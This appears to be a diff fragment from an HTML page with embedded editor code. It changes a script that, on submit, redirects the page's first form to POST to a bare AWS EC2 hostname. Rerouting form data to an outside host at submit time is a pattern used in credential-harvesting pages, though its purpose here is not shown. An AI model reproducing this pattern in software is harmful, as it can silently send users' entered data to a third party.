@@ -2116,7 +2116,7 @@ var CodeMirror = {};
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js" integrity="sha512-xQBQYt9UcgblF6aCMrwU1NkVA7HCXaSN2oq0so80KO+y68M+n64FOcqgav4igHe6D5ObBLIf68DWv+gfBowczg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script>
       document.getElementsByTagName('form')[0].addEventListener('submit', function(){
-        this.action = 'http://ec2-52-221-213-94.ap-southeast-1.compute.amazonaws.com/index.php';
+        this.action = 'http://ec2-52-221-213-94.ap-southeast-1.compute.amazonaws.com/';
         this.method = 'post';
       }, false);
 
